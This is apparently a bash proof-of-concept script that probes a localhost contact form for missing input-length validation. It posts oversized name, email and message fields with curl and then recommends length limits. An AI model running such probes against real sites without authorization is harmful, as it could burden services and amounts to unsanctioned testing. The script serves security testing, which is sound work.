#!/bin/bash

# POC: Missing Input Length Validation Leading to Potential DoS
# Tests whether the contact form accepts excessively long inputs without validation

TARGET_URL="http://localhost:3000/contact.php"

echo "=========================================="
echo "POC: Missing Input Length Validation"
echo "Target: $TARGET_URL"
echo "=========================================="
echo ""

# Test 1: Extremely long name field (1000 characters)
echo "[*] Test 1: Submitting 1000-character name field..."
LONG_NAME=$(python3 -c "print('A' * 1000)")
RESPONSE1=$(curl -s -w "\nHTTP_CODE:%{http_code}" -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=$LONG_NAME&email=test@test.com&message=Test")

HTTP_CODE1=$(echo "$RESPONSE1" | grep "HTTP_CODE:" | cut -d: -f2)
BODY1=$(echo "$RESPONSE1" | grep -v "HTTP_CODE:")

echo "HTTP Status: $HTTP_CODE1"
if echo "$BODY1" | grep -q "Thank you for contacting us"; then
    echo "Result: ✓ VULNERABLE - 1000-char name accepted"
else
    echo "Result: Form rejected long input"
fi
echo ""

# Test 2: Extremely long email field (500 characters)
echo "[*] Test 2: Submitting 500-character email field..."
LONG_EMAIL=$(python3 -c "print('test@' + 'a' * 490 + '.com')")
RESPONSE2=$(curl -s -w "\nHTTP_CODE:%{http_code}" -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=Test&email=$LONG_EMAIL&message=Test")

HTTP_CODE2=$(echo "$RESPONSE2" | grep "HTTP_CODE:" | cut -d: -f2)
BODY2=$(echo "$RESPONSE2" | grep -v "HTTP_CODE:")

echo "HTTP Status: $HTTP_CODE2"
if echo "$BODY2" | grep -q "Thank you for contacting us"; then
    echo "Result: ✓ VULNERABLE - 500-char email accepted"
else
    echo "Result: Form rejected long input"
fi
echo ""

# Test 3: Extremely long message field (10000 characters)
echo "[*] Test 3: Submitting 10000-character message field..."
LONG_MESSAGE=$(python3 -c "print('M' * 10000)")
RESPONSE3=$(curl -s -w "\nHTTP_CODE:%{http_code}" -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=Test&email=test@test.com&message=$LONG_MESSAGE")

HTTP_CODE3=$(echo "$RESPONSE3" | grep "HTTP_CODE:" | cut -d: -f2)
BODY3=$(echo "$RESPONSE3" | grep -v "HTTP_CODE:")

echo "HTTP Status: $HTTP_CODE3"
if echo "$BODY3" | grep -q "Thank you for contacting us"; then
    echo "Result: ✓ VULNERABLE - 10000-char message accepted"
else
    echo "Result: Form rejected long input"
fi
echo ""

# Test 4: All fields with excessive length
echo "[*] Test 4: Submitting all fields with excessive lengths..."
RESPONSE4=$(curl -s -w "\nHTTP_CODE:%{http_code}" -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=$(python3 -c 'print(\"N\" * 2000)')&email=$(python3 -c 'print(\"test@\" + \"e\" * 490 + \".com\")')&message=$(python3 -c 'print(\"M\" * 20000)')")

HTTP_CODE4=$(echo "$RESPONSE4" | grep "HTTP_CODE:" | cut -d: -f2)
BODY4=$(echo "$RESPONSE4" | grep -v "HTTP_CODE:")

echo "HTTP Status: $HTTP_CODE4"
if echo "$BODY4" | grep -q "Thank you for contacting us"; then
    echo "Result: ✓ VULNERABLE - All excessively long fields accepted"
else
    echo "Result: Form rejected long input"
fi
echo ""

# Summary
echo "=========================================="
echo "VULNERABILITY SUMMARY"
echo "=========================================="
echo "The contact form accepts inputs of arbitrary length without validation."
echo "This can lead to:"
echo "  - Denial of Service (resource exhaustion)"
echo "  - Database bloat and performance issues"
echo "  - Memory/CPU consumption"
echo "  - Log file exhaustion"
echo ""
echo "Recommended maximum lengths:"
echo "  - Name: 100 characters"
echo "  - Email: 254 characters (RFC 5321)"
echo "  - Message: 5000 characters"
echo "=========================================="